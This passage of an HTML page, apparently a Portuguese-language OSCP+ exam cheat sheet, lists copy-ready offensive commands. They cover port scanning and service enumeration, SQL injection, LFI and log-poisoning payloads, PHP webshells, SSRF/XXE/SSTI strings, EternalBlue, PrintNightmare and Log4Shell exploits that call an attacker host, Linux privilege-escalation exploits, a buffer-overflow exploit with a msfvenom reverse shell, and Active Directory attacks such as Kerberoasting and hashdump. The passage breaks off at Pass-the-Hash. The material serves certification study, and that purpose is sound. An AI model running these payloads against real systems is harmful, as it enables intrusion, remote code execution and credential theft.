+    <div class="ch"><span class="ico">📡</span><span class="title">Nmap — Scanning Completo</span><span class="sub">ESSENCIAL</span></div>
+    <div class="cb0">
+      <div class="g2">
+        <div class="cb"><pre><span class="dc"># Scan rápido todas as portas</span>
+<span class="gc">nmap</span> <span class="cc">-p-</span> <span class="cc">--min-rate</span> <span class="yc">5000</span> <span class="cc">-T4</span> <span class="cc">-oN</span> <span class="oc">allports.txt</span> <span class="wc">$IP</span>
+
+<span class="dc"># Detalhado nas portas abertas</span>
+<span class="gc">nmap</span> <span class="cc">-sC</span> <span class="cc">-sV</span> <span class="cc">-p</span> <span class="yc">22,80,443,445,8080</span> <span class="cc">-oA</span> <span class="oc">detail</span> <span class="wc">$IP</span>
+
+<span class="dc"># UDP top 100</span>
+<span class="gc">sudo nmap</span> <span class="cc">-sU</span> <span class="cc">--top-ports</span> <span class="yc">100</span> <span class="wc">$IP</span>
+
+<span class="dc"># All-in-one OSCP one-liner</span>
+<span class="gc">nmap</span> <span class="cc">-sC</span> <span class="cc">-sV</span> <span class="cc">-p-</span> <span class="cc">--min-rate</span> <span class="yc">3000</span> <span class="cc">-oA</span> <span class="oc">nmap/full</span> <span class="wc">$IP</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        <div class="cb"><pre><span class="dc"># NSE scripts úteis</span>
+<span class="gc">nmap</span> <span class="cc">--script</span> <span class="yc">vuln</span> <span class="cc">-p</span> <span class="yc">80,443,445</span> <span class="wc">$IP</span>
+<span class="gc">nmap</span> <span class="cc">--script</span> <span class="yc">smb-enum-shares,smb-enum-users</span> <span class="cc">-p445</span> <span class="wc">$IP</span>
+<span class="gc">nmap</span> <span class="cc">--script</span> <span class="yc">smb-vuln-ms17-010</span> <span class="cc">-p445</span> <span class="wc">$IP</span>
+<span class="gc">nmap</span> <span class="cc">--script</span> <span class="yc">http-enum,http-methods</span> <span class="cc">-p</span> <span class="yc">80,443</span> <span class="wc">$IP</span>
+<span class="gc">nmap</span> <span class="cc">--script</span> <span class="yc">ftp-anon,ftp-brute</span> <span class="cc">-p21</span> <span class="wc">$IP</span>
+
+<span class="dc"># Flags importantes</span>
+<span class="dc"># -Pn  : skip ping (host firewallado)</span>
+<span class="dc"># -n   : sem DNS resolution (mais rápido)</span>
+<span class="dc"># -sS  : SYN scan (stealth, precisa root)</span>
+<span class="dc"># -sT  : TCP connect (sem root)</span>
+<span class="dc"># -A   : OS + version + scripts + traceroute</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card cgreen">
+      <div class="ch"><span class="ico">🗂</span><span class="title">SMB Enumeration</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Shares anônimas</span>
+<span class="gc">smbclient</span> <span class="cc">-L</span> <span class="wc">$IP</span> <span class="cc">-N</span>
+<span class="gc">smbmap</span> <span class="cc">-H</span> <span class="wc">$IP</span>
+<span class="gc">crackmapexec</span> <span class="yc">smb</span> <span class="wc">$IP</span> <span class="cc">--shares</span>
+
+<span class="dc"># Com credencial</span>
+<span class="gc">smbclient</span> <span class="yc">//</span><span class="wc">$IP</span><span class="yc">/share</span> <span class="cc">-U</span> <span class="oc">'user%pass'</span>
+<span class="gc">smbmap</span> <span class="cc">-H</span> <span class="wc">$IP</span> <span class="cc">-u</span> <span class="oc">user</span> <span class="cc">-p</span> <span class="oc">pass</span>
+
+<span class="dc"># Enum completo</span>
+<span class="gc">enum4linux-ng</span> <span class="cc">-A</span> <span class="wc">$IP</span>
+
+<span class="dc"># EternalBlue check</span>
+<span class="gc">nmap</span> <span class="cc">--script</span> <span class="yc">smb-vuln-ms17-010</span> <span class="cc">-p445</span> <span class="wc">$IP</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cpurple">
+      <div class="ch"><span class="ico">🔒</span><span class="title">SNMP / LDAP / RPC / NFS</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># SNMP v1/v2 walk</span>
+<span class="gc">snmpwalk</span> <span class="cc">-c</span> <span class="oc">public</span> <span class="cc">-v1</span> <span class="wc">$IP</span>
+<span class="gc">onesixtyone</span> <span class="cc">-c</span> <span class="oc">community.txt</span> <span class="wc">$IP</span>
+
+<span class="dc"># LDAP anônimo</span>
+<span class="gc">ldapsearch</span> <span class="cc">-x</span> <span class="cc">-H</span> <span class="oc">ldap://</span><span class="wc">$IP</span> <span class="cc">-b</span> <span class="oc">"dc=domain,dc=local"</span>
+
+<span class="dc"># RPC enum</span>
+<span class="gc">rpcclient</span> <span class="cc">-U</span> <span class="oc">""</span> <span class="cc">-N</span> <span class="wc">$IP</span>
+<span class="pc">enumdomusers</span> <span class="dc">→ querydispinfo → lsaenumsid</span>
+
+<span class="dc"># NFS shares</span>
+<span class="gc">showmount</span> <span class="cc">-e</span> <span class="wc">$IP</span>
+<span class="gc">sudo mount</span> <span class="cc">-t nfs</span> <span class="wc">$IP</span><span class="oc">:/share</span> <span class="yc">/mnt/nfs</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">🌐</span><span class="title">Web Enumeration</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Directory bruteforce</span>
+<span class="gc">gobuster</span> <span class="yc">dir</span> <span class="cc">-u</span> <span class="oc">http://</span><span class="wc">$IP</span> <span class="cc">-w</span> <span class="oc">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="cc">-x</span> <span class="yc">php,txt,html,bak</span> <span class="cc">-t</span> <span class="yc">50</span>
+<span class="gc">feroxbuster</span> <span class="cc">-u</span> <span class="oc">http://</span><span class="wc">$IP</span> <span class="cc">-w</span> <span class="oc">/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span>
+
+<span class="dc"># VHost bruteforce</span>
+<span class="gc">gobuster</span> <span class="yc">vhost</span> <span class="cc">-u</span> <span class="oc">http://</span><span class="wc">$DOMAIN</span> <span class="cc">-w</span> <span class="oc">subdomains-top1million.txt</span> <span class="cc">--append-domain</span>
+
+<span class="dc"># DNS enum</span>
+<span class="gc">dnsenum</span> <span class="wc">$DOMAIN</span>
+<span class="gc">gobuster</span> <span class="yc">dns</span> <span class="cc">-d</span> <span class="wc">$DOMAIN</span> <span class="cc">-w</span> <span class="oc">subs.txt</span>
+
+<span class="dc"># Nikto web scanner</span>
+<span class="gc">nikto</span> <span class="cc">-h</span> <span class="oc">http://</span><span class="wc">$IP</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cyellow">
+      <div class="ch"><span class="ico">🖧</span><span class="title">FTP / SSH / SMTP / MySQL</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># FTP anônimo</span>
+<span class="gc">ftp</span> <span class="wc">$IP</span>  <span class="dc">→ anonymous / anonymous</span>
+<span class="gc">wget</span> <span class="cc">-r</span> <span class="oc">ftp://</span><span class="wc">$IP</span><span class="oc">/</span> <span class="cc">--user</span><span class="oc">=anonymous</span> <span class="cc">--password</span><span class="oc">=anon</span>
+
+<span class="dc"># SMTP user enum</span>
+<span class="gc">smtp-user-enum</span> <span class="cc">-M</span> <span class="yc">VRFY</span> <span class="cc">-U</span> <span class="oc">users.txt</span> <span class="cc">-t</span> <span class="wc">$IP</span>
+
+<span class="dc"># MySQL</span>
+<span class="gc">mysql</span> <span class="cc">-u</span> <span class="oc">root</span> <span class="cc">-h</span> <span class="wc">$IP</span> <span class="cc">-p</span>
+<span class="pc">SHOW DATABASES; SELECT user(); SELECT @@version;</span>
+
+<span class="dc"># SSH version check</span>
+<span class="gc">ssh-audit</span> <span class="wc">$IP</span>
+<span class="gc">ssh</span> <span class="cc">-v</span> <span class="oc">user@</span><span class="wc">$IP</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 2. WEB ATTACKS ══════ -->
+<section class="sec" id="web">
+  <div class="sec-head">
+    <span class="sec-num">02</span>
+    <span class="sec-title">Web Application Attacks</span>
+    <span class="sec-badge">OWASP</span>
+  </div>
+
+  <div class="g2">
+    <div class="card cred">
+      <div class="ch"><span class="ico">💉</span><span class="title">SQL Injection</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Testes manuais de detecção</span>
+<span class="oc">'</span>           <span class="dc">→ erro? vulnerável</span>
+<span class="oc">' OR '1'='1</span>
+<span class="oc">' OR 1=1 --</span>
+<span class="oc">' UNION SELECT 1,2,3 --</span>
+<span class="oc">'; SELECT SLEEP(5)--</span>  <span class="dc">(blind time-based)</span>
+
+<span class="dc"># SQLMap (permitido OSCP)</span>
+<span class="gc">sqlmap</span> <span class="cc">-u</span> <span class="oc">"http://</span><span class="wc">$IP</span><span class="oc">/page?id=1"</span> <span class="cc">--dbs</span>
+<span class="gc">sqlmap</span> <span class="cc">-u</span> <span class="oc">"http://</span><span class="wc">$IP</span><span class="oc">/page?id=1"</span> <span class="cc">-D</span> <span class="yc">dbname</span> <span class="cc">--tables</span>
+<span class="gc">sqlmap</span> <span class="cc">-u</span> <span class="oc">"..."</span> <span class="cc">--os-shell</span>
+<span class="gc">sqlmap</span> <span class="cc">-r</span> <span class="oc">request.txt</span> <span class="cc">--level</span> <span class="yc">5</span> <span class="cc">--risk</span> <span class="yc">3</span>
+<span class="gc">sqlmap</span> <span class="cc">-r</span> <span class="oc">req.txt</span> <span class="cc">--batch</span> <span class="cc">--dbs</span> <span class="cc">--forms</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card corange" style="border-top-color:var(--neon-o)">
+      <div class="ch"><span class="ico">📁</span><span class="title">LFI / RFI / Path Traversal</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># LFI básico</span>
+<span class="oc">?file=../../../../etc/passwd</span>
+<span class="oc">?file=....//....//etc/passwd</span>
+<span class="oc">?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd</span>
+
+<span class="dc"># PHP wrappers</span>
+<span class="oc">?file=php://filter/convert.base64-encode/resource=index.php</span>
+<span class="oc">?file=php://input</span>   <span class="dc">(POST: &lt;?php system($_GET['cmd']); ?&gt;)</span>
+<span class="oc">?file=data://text/plain;base64,BASE64_CMD</span>
+
+<span class="dc"># Log Poisoning → RCE</span>
+<span class="dc"># 1. Injeta no User-Agent:</span>
+<span class="gc">curl</span> <span class="cc">-H</span> <span class="oc">"User-Agent: &lt;?php system(\$_GET['c']); ?&gt;"</span> <span class="oc">http://</span><span class="wc">$IP</span>
+<span class="dc"># 2. Include log via LFI:</span>
+<span class="oc">?file=/var/log/apache2/access.log&amp;c=id</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">📤</span><span class="title">File Upload Bypass</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Extensão bypass</span>
+<span class="oc">shell.php</span> → <span class="oc">shell.php5</span> | <span class="oc">shell.phtml</span> | <span class="oc">shell.pHp</span>
+<span class="oc">shell.php.jpg</span>  <span class="dc">(double extension)</span>
+<span class="oc">shell.php%00.jpg</span>  <span class="dc">(null byte, PHP < 5.4)</span>
+
+<span class="dc"># Magic bytes GIF header</span>
+<span class="gc">echo</span> <span class="oc">'GIF89a;&lt;?php system($_GET["c"]); ?&gt;'</span> <span class="dc">&gt; shell.php.gif</span>
+
+<span class="dc"># MIME type bypass com Burp</span>
+<span class="dc"># Mudar: Content-Type: image/jpeg</span>
+<span class="dc"># Manter extensão .php</span>
+
+<span class="dc"># Webshell simples</span>
+<span class="gc">echo</span> <span class="oc">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> <span class="dc">&gt; shell.php</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cpurple">
+      <div class="ch"><span class="ico">🔗</span><span class="title">SSRF / XXE / Command Injection</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># SSRF → acesso interno</span>
+<span class="oc">?url=http://127.0.0.1/admin</span>
+<span class="oc">?url=http://169.254.169.254/latest/meta-data/</span>
+<span class="oc">?url=file:///etc/passwd</span>
+
+<span class="dc"># XXE</span>
+<span class="pc">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span>
+
+<span class="dc"># Command injection chars</span>
+<span class="oc">; id</span> | <span class="oc">| id</span> | <span class="oc">&amp;&amp; id</span> | <span class="oc">` id`</span> | <span class="oc">$(id)</span>
+<span class="oc">%0a id</span>  <span class="dc">(newline)</span> | <span class="oc">||id</span>
+
+<span class="dc"># SSTI (template injection)</span>
+<span class="oc">{{7*7}}</span> | <span class="oc">${7*7}</span> | <span class="oc">&lt;%= 7*7 %&gt;</span>
+<span class="oc">{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 3. EXPLOITATION ══════ -->
+<section class="sec" id="exploitation">
+  <div class="sec-head">
+    <span class="sec-num">03</span>
+    <span class="sec-title">Exploitation — Initial Access</span>
+    <span class="sec-badge">INITIAL ACCESS</span>
+  </div>
+
+  <div class="g2">
+    <div class="card cred">
+      <div class="ch"><span class="ico">🔍</span><span class="title">searchsploit — ExploitDB</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Busca por serviço e versão</span>
+<span class="gc">searchsploit</span> <span class="yc">apache 2.4.49</span>
+<span class="gc">searchsploit</span> <span class="yc">vsftpd 2.3.4</span>
+<span class="gc">searchsploit</span> <span class="yc">samba 3.5.0</span>
+<span class="gc">searchsploit</span> <span class="yc">windows smb</span>
+
+<span class="dc"># Copiar exploit local</span>
+<span class="gc">searchsploit</span> <span class="cc">-m</span> <span class="yc">44555</span>
+<span class="gc">searchsploit</span> <span class="cc">-x</span> <span class="yc">44555</span>  <span class="dc">(examinar)</span>
+
+<span class="dc"># Update database</span>
+<span class="gc">searchsploit</span> <span class="cc">-u</span>
+
+<span class="dc"># Busca por CVE</span>
+<span class="gc">searchsploit</span> <span class="cc">--cve</span> <span class="yc">2021-41773</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cyellow">
+      <div class="ch"><span class="ico">🧨</span><span class="title">Metasploit (usar em 1 alvo apenas)</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Fluxo básico MSF</span>
+<span class="gc">msfconsole</span> <span class="cc">-q</span>
+<span class="pc">search</span> <span class="yc">ms17-010</span>
+<span class="pc">use</span> <span class="yc">exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="pc">set</span> RHOSTS <span class="wc">$IP</span>
+<span class="pc">set</span> LHOST <span class="wc">$LHOST</span>
+<span class="pc">set</span> LPORT <span class="yc">4444</span>
+<span class="pc">run</span>
+
+<span class="dc"># Meterpreter pós-exploit</span>
+<span class="pc">shell</span>      <span class="dc">→ getuid → getsystem → hashdump</span>
+<span class="pc">sysinfo</span>   <span class="pc">upload</span>   <span class="pc">download</span>
+<span class="pc">run post/windows/gather/credentials/credential_collector</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        <div class="alert alert-r">
+          <div class="alert-label">REGRA OSCP+</div>
+          Metasploit = 1 alvo apenas. Sem Meterpreter em pivoting!
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card cgreen">
+    <div class="ch"><span class="ico">⚙️</span><span class="title">Exploits Manuais Comuns — CVEs Clássicos</span></div>
+    <div class="cb0">
+      <div class="g2">
+        <div class="cb"><pre><span class="dc"># EternalBlue sem MSF</span>
+<span class="gc">python3</span> <span class="oc">AutoBlue-MS17-010/eternalblue_exploit7.py</span> <span class="wc">$IP</span> <span class="yc">shellcode/sc_x64.bin</span>
+
+<span class="dc"># PrintNightmare (CVE-2021-1675)</span>
+<span class="gc">python3</span> <span class="oc">CVE-2021-1675.py</span> <span class="oc">domain/user:pass@</span><span class="wc">$IP</span> <span class="yc">'\\ATTACKER\share\evil.dll'</span>
+
+<span class="dc"># Log4Shell (CVE-2021-44228)</span>
+<span class="oc">${jndi:ldap://LHOST:1389/payload}</span>
+
+<span class="dc"># Apache path traversal (CVE-2021-41773)</span>
+<span class="gc">curl</span> <span class="oc">"http://</span><span class="wc">$IP</span><span class="oc">/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        <div class="cb"><pre><span class="dc"># DirtyCow (CVE-2016-5195) — Linux kernel 2.6-4.8</span>
+<span class="gc">gcc</span> <span class="cc">-pthread</span> <span class="oc">dirty.c</span> <span class="cc">-o</span> <span class="yc">dirty</span> <span class="cc">-lcrypt</span>
+<span class="gc">./dirty</span> <span class="yc">newpass</span>
+
+<span class="dc"># DirtyPipe (CVE-2022-0847) — Linux 5.8-5.16</span>
+<span class="gc">./dirtypipe</span> <span class="oc">/etc/passwd</span>
+
+<span class="dc"># Sudo Baron Samedit (CVE-2021-3156)</span>
+<span class="gc">sudoedit</span> <span class="cc">-s</span> <span class="oc">'\' $(python3 -c 'print("A"*65536)')</span>
+
+<span class="dc"># PwnKit (CVE-2021-4034) — pkexec</span>
+<span class="gc">./pwnkit</span>  <span class="dc">→ root</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 4. BUFFER OVERFLOW ══════ -->
+<section class="sec" id="bof">
+  <div class="sec-head">
+    <span class="sec-num">04</span>
+    <span class="sec-title">Buffer Overflow — x86 Stack</span>
+    <span class="sec-badge">EXPLOIT DEV</span>
+  </div>
+
+  <div class="alert alert-y" style="margin-bottom:16px">
+    <div class="alert-label">OSCP+ 2026</div>
+    BOF não é garantido no exame. Faz parte das standalone machines (até 20pts). Domine a metodologia pois é conteúdo PEN-200.
+  </div>
+
+  <div class="flow">
+    <div class="flow-step"><div class="fs-num">1</div><div class="fs-txt">Fuzzing → Find Crash</div></div>
+    <div class="flow-step"><div class="fs-num">2</div><div class="fs-txt">Pattern → EIP Offset</div></div>
+    <div class="flow-step"><div class="fs-num">3</div><div class="fs-txt">Bad Chars</div></div>
+    <div class="flow-step"><div class="fs-num">4</div><div class="fs-txt">JMP ESP / Return Addr</div></div>
+    <div class="flow-step"><div class="fs-num">5</div><div class="fs-txt">Shellcode + NOP sled</div></div>
+    <div class="flow-step"><div class="fs-num">6</div><div class="fs-txt">Exploit!</div></div>
+  </div>
+
+  <div class="g2" style="margin-top:16px">
+    <div>
+      <div class="card ccyan">
+        <div class="ch"><span class="ico">1️⃣</span><span class="title">Fuzzing — Encontrar o Crash</span></div>
+        <div class="cb0">
+          <div class="cb"><pre><span class="dc"># Script de fuzzing incremental</span>
+<span class="pc">import</span> socket
+buf = <span class="oc">b"A"</span> * <span class="yc">100</span>
+<span class="pc">while True</span>:
+  <span class="pc">try</span>:
+    s = socket.socket()
+    s.connect((<span class="oc">"</span><span class="wc">$IP</span><span class="oc">"</span>, <span class="yc">PORT</span>))
+    s.send(<span class="oc">b"TRUN /.:/"</span> + buf + <span class="oc">b"\r\n"</span>)
+    s.close()
+    buf += <span class="oc">b"A"</span> * <span class="yc">100</span>
+    <span class="pc">print</span>(<span class="pc">len</span>(buf))
+  <span class="pc">except Exception as e</span>:
+    <span class="pc">print</span>(<span class="oc">f"Crashed at {len(buf)}"</span>)
+    <span class="pc">break</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        </div>
+      </div>
+
+      <div class="card cgreen">
+        <div class="ch"><span class="ico">2️⃣</span><span class="title">Offset — Controlar EIP</span></div>
+        <div class="cb0">
+          <div class="cb"><pre><span class="dc"># Gerar cyclic pattern</span>
+<span class="gc">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span> <span class="cc">-l</span> <span class="yc">3000</span>
+<span class="dc"># ou</span>
+<span class="gc">python3</span> <span class="cc">-c</span> <span class="oc">"from pwn import *; print(cyclic(3000))"</span>
+
+<span class="dc"># Enviar pattern; anotar EIP no crash</span>
+<span class="dc"># Calcular offset:</span>
+<span class="gc">pattern_offset.rb</span> <span class="cc">-l</span> <span class="yc">3000</span> <span class="cc">-q</span> <span class="yc">EIP_VALUE</span>
+<span class="dc"># ou:</span>
+<span class="gc">python3</span> <span class="cc">-c</span> <span class="oc">"from pwn import *; print(cyclic_find(0xEIP_VALUE))"</span>
+
+<span class="dc"># Verificar: enviar offset A's + BBBB (EIP = 0x42424242)</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="card cpurple">
+        <div class="ch"><span class="ico">3️⃣</span><span class="title">Bad Chars + JMP ESP</span></div>
+        <div class="cb0">
+          <div class="cb"><pre><span class="dc"># Gerar todos bad chars (exceto \x00)</span>
+<span class="dc"># Immunity Debugger:</span>
+<span class="pc">!mona bytearray</span> <span class="cc">-b</span> <span class="oc">"\x00"</span>
+<span class="dc"># Enviar após EIP controlado</span>
+<span class="pc">!mona compare</span> <span class="cc">-f</span> <span class="oc">bytearray.bin</span> <span class="cc">-a</span> <span class="yc">ESP_ADDR</span>
+<span class="dc"># Remover bad chars encontrados e repetir</span>
+
+<span class="dc"># Encontrar JMP ESP (módulo sem ASLR)</span>
+<span class="pc">!mona jmp</span> <span class="cc">-r</span> <span class="yc">esp</span> <span class="cc">-cpb</span> <span class="oc">"\x00\xbad"</span>
+<span class="dc"># Endereço em little-endian no exploit:</span>
+<span class="pc">import</span> struct
+EIP = struct.pack(<span class="oc">"&lt;I"</span>, <span class="yc">0x625011AF</span>)</pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        </div>
+      </div>
+
+      <div class="card cred">
+        <div class="ch"><span class="ico">5️⃣</span><span class="title">Shellcode + Exploit Final</span></div>
+        <div class="cb0">
+          <div class="cb"><pre><span class="dc"># Gerar shellcode com msfvenom</span>
+<span class="gc">msfvenom</span> <span class="cc">-p</span> <span class="yc">windows/shell_reverse_tcp</span> LHOST=<span class="wc">$LHOST</span> LPORT=<span class="yc">4444</span> <span class="cc">-b</span> <span class="oc">"\x00\xbad"</span> <span class="cc">-f</span> <span class="yc">python</span> <span class="cc">-v</span> <span class="yc">shellcode</span>
+
+<span class="dc"># Estrutura do exploit:</span>
+buf = <span class="oc">b"A"</span> * <span class="yc">OFFSET</span>       <span class="dc"># padding</span>
+buf += EIP                  <span class="dc"># JMP ESP addr (little-endian)</span>
+buf += <span class="oc">b"\x90"</span> * <span class="yc">16</span>        <span class="dc"># NOP sled</span>
+buf += shellcode            <span class="dc"># payload</span>
+
+<span class="dc"># Listener:</span>
+<span class="gc">nc</span> <span class="cc">-lvnp</span> <span class="yc">4444</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════ 5. ACTIVE DIRECTORY ══════ -->
+<section class="sec" id="ad">
+  <div class="sec-head">
+    <span class="sec-num">05</span>
+    <span class="sec-title">Active Directory Attacks</span>
+    <span class="sec-badge">40 PONTOS</span>
+  </div>
+
+  <div class="alert alert-p" style="margin-bottom:16px">
+    <div class="alert-label">AD KILL CHAIN OSCP+</div>
+    <strong style="color:#fff">Creds fornecidos</strong> → BloodHound enum → Kerberoast/ASREPRoast/PtH → Lateral Movement → DA → DCSync → proof.txt
+  </div>
+
+  <div class="g2">
+    <div class="card cpurple">
+      <div class="ch"><span class="ico">🩸</span><span class="title">BloodHound / SharpHound</span><span class="sub">MAPEAMENTO DO DOMÍNIO</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># SharpHound (Windows target)</span>
+<span class="gc">.\SharpHound.exe</span> <span class="cc">-c</span> <span class="yc">All</span> <span class="cc">--zipfilename</span> <span class="oc">bh.zip</span>
+<span class="gc">.\SharpHound.exe</span> <span class="cc">-c</span> <span class="yc">All,GPOLocalGroup</span> <span class="cc">--stealth</span>
+
+<span class="dc"># BloodHound.py (Linux, agentless)</span>
+<span class="gc">bloodhound-python</span> <span class="cc">-u</span> <span class="oc">user</span> <span class="cc">-p</span> <span class="oc">pass</span> <span class="cc">-d</span> <span class="oc">domain.local</span> <span class="cc">-dc</span> <span class="wc">$DC_IP</span> <span class="cc">-c</span> <span class="yc">All</span>
+<span class="gc">bloodhound-python</span> <span class="cc">-u</span> <span class="oc">user</span> <span class="cc">-p</span> <span class="oc">pass</span> <span class="cc">-d</span> <span class="oc">domain.local</span> <span class="cc">-ns</span> <span class="wc">$DC_IP</span>
+
+<span class="dc"># Neo4j + BloodHound GUI</span>
+<span class="gc">sudo neo4j start</span>
+<span class="gc">bloodhound &amp;</span>
+
+<span class="dc"># Queries úteis no GUI:</span>
+<span class="dc"># "Shortest Paths to Domain Admins"</span>
+<span class="dc"># "Find AS-REP Roastable Users"</span>
+<span class="dc"># "Find Kerberoastable Users"</span>
+<span class="dc"># "Find Computers where Domain Users are Local Admin"</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card ccyan">
+      <div class="ch"><span class="ico">🔍</span><span class="title">Enum Domínio com PowerView / CrackMapExec</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># PowerView (Windows)</span>
+<span class="gc">Get-NetDomain</span>
+<span class="gc">Get-NetUser</span> | <span class="pc">select</span> samaccountname, description
+<span class="gc">Get-NetComputer</span> <span class="cc">-Properties</span> <span class="yc">dnshostname,operatingsystem</span>
+<span class="gc">Get-NetGroup</span> <span class="oc">"Domain Admins"</span> <span class="cc">-Recurse</span>
+<span class="gc">Get-NetLocalGroupMember</span> <span class="cc">-ComputerName</span> <span class="wc">$TARGET</span>
+<span class="gc">Find-LocalAdminAccess</span>
+<span class="gc">Get-NetSession</span> <span class="cc">-ComputerName</span> <span class="wc">$DC</span>
+
+<span class="dc"># CrackMapExec</span>
+<span class="gc">crackmapexec</span> <span class="yc">smb</span> <span class="wc">$IP</span> <span class="cc">-u</span> <span class="oc">user</span> <span class="cc">-p</span> <span class="oc">pass</span> <span class="cc">--users</span>
+<span class="gc">crackmapexec</span> <span class="yc">smb</span> <span class="wc">$IP</span> <span class="cc">-u</span> <span class="oc">user</span> <span class="cc">-p</span> <span class="oc">pass</span> <span class="cc">--groups</span>
+<span class="gc">crackmapexec</span> <span class="yc">smb</span> <span class="wc">$CIDR</span> <span class="cc">-u</span> <span class="oc">user</span> <span class="cc">-p</span> <span class="oc">pass</span> <span class="cc">--local-auth</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card cyellow">
+      <div class="ch"><span class="ico">🎫</span><span class="title">Kerberoasting</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Impacket (Linux)</span>
+<span class="gc">GetUserSPNs.py</span> <span class="oc">domain.local/user:pass</span> <span class="cc">-dc-ip</span> <span class="wc">$DC</span> <span class="cc">-request</span>
+<span class="gc">GetUserSPNs.py</span> <span class="oc">domain.local/user:pass</span> <span class="cc">-dc-ip</span> <span class="wc">$DC</span> <span class="cc">-outputfile</span> <span class="oc">hashes.txt</span>
+
+<span class="dc"># PowerView (Windows)</span>
+<span class="gc">Get-DomainUser</span> <span class="cc">-SPN</span> <span class="cc">-Properties</span> <span class="yc">samaccountname,serviceprincipalname</span>
+<span class="gc">Invoke-Kerberoast</span> <span class="cc">-OutputFormat</span> <span class="yc">hashcat</span>
+
+<span class="dc"># Crackear TGS (hashcat -m 13100)</span>
+<span class="gc">hashcat</span> <span class="cc">-m</span> <span class="yc">13100</span> <span class="oc">tgs.txt</span> <span class="oc">rockyou.txt</span> <span class="cc">--force</span>
+<span class="gc">hashcat</span> <span class="cc">-m</span> <span class="yc">13100</span> <span class="oc">tgs.txt</span> <span class="oc">rockyou.txt</span> <span class="cc">-r</span> <span class="oc">best64.rule</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+
+    <div class="card cred">
+      <div class="ch"><span class="ico">🎟️</span><span class="title">AS-REP Roasting</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Users sem Kerberos pre-auth</span>
+<span class="gc">GetNPUsers.py</span> <span class="oc">domain.local/</span> <span class="cc">-usersfile</span> <span class="oc">users.txt</span> <span class="cc">-dc-ip</span> <span class="wc">$DC</span> <span class="cc">-no-pass</span>
+<span class="gc">GetNPUsers.py</span> <span class="oc">domain.local/user:pass</span> <span class="cc">-request</span> <span class="cc">-dc-ip</span> <span class="wc">$DC</span>
+
+<span class="dc"># PowerView</span>
+<span class="gc">Get-DomainUser</span> <span class="cc">-PreauthNotRequired</span>
+<span class="gc">Get-ASREPHash</span> <span class="cc">-Username</span> <span class="yc">vulnuser</span> <span class="cc">-Domain</span> <span class="oc">domain.local</span>
+
+<span class="dc"># Crackear AS-REP (hashcat -m 18200)</span>
+<span class="gc">hashcat</span> <span class="cc">-m</span> <span class="yc">18200</span> <span class="oc">asrep.txt</span> <span class="oc">rockyou.txt</span></pre><button class="cp" onclick="cp(this)">COPY</button></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card cpurple">
+      <div class="ch"><span class="ico">🔑</span><span class="title">Pass-the-Hash / Pass-the-Ticket</span></div>
+      <div class="cb0">
+        <div class="cb"><pre><span class="dc"># Pass-the-Hash</span>
